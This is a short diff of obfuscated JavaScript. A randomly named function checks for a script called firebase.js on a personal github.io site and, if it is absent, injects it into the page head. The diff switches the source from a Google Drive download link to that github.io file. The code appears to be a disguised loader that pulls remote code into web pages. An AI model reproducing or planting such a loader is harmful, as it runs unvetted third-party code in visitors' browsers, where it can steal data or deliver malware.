@@ -82,7 +82,7 @@ function nzb0gv8xkntrl() {
     let _0x491e66 = document.querySelectorAll('script[src=\"https://yuushaexa.github.io/web/dev/firebase.js\"]');
     if (_0x491e66['length'] < 0x1) {
         let _0x5a3bc4 = document.createElement('script');
-        _0x5a3bc4['src'] = 'https://drive.google.com/uc?export=download&id=1sD3xt1wVnEdLtIZfKK_1N8VfjNvKgYeK';
+        _0x5a3bc4['src'] = 'https://yuushaexa.github.io/web/dev/firebase.js';
         document.getElementsByTagName('head')[0x0].appendChild(_0x5a3bc4);
     }
 }
